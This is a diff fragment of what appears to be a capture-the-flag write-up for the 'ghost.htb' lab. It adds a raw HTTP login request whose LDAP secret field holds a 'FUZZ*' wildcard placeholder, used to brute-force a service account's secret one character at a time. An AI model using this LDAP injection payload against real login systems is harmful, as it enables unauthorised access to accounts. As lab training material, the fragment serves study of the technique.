@@ -411,7 +411,38 @@ So i can use a character wordlist to find the correct secret
 
 Ill create a wordlist to do this
 
+```python
+POST /login HTTP/1.1
+Host: intranet.ghost.htb:8008
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/x-component
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://intranet.ghost.htb:8008/login
+Next-Action: c471eb076ccac91d6f828b671795550fd5925940
+Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22login%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D
+Content-Type: multipart/form-data; boundary=----geckoformboundary7d9e9ef2cf79193384b4632ed29c67f1
+Content-Length: 478
+Origin: http://intranet.ghost.htb:8008
+Connection: keep-alive
+Priority: u=0
 
+------geckoformboundary7d9e9ef2cf79193384b4632ed29c67f1
+Content-Disposition: form-data; name="1_ldap-username"
+
+gitea_temp_principal
+------geckoformboundary7d9e9ef2cf79193384b4632ed29c67f1
+Content-Disposition: form-data; name="1_ldap-secret"
+
+FUZZ*
+------geckoformboundary7d9e9ef2cf79193384b4632ed29c67f1
+Content-Disposition: form-data; name="0"
+
+[{},"$K1"]
+------geckoformboundary7d9e9ef2cf79193384b4632ed29c67f1--
+```
+
+I
 
 
 
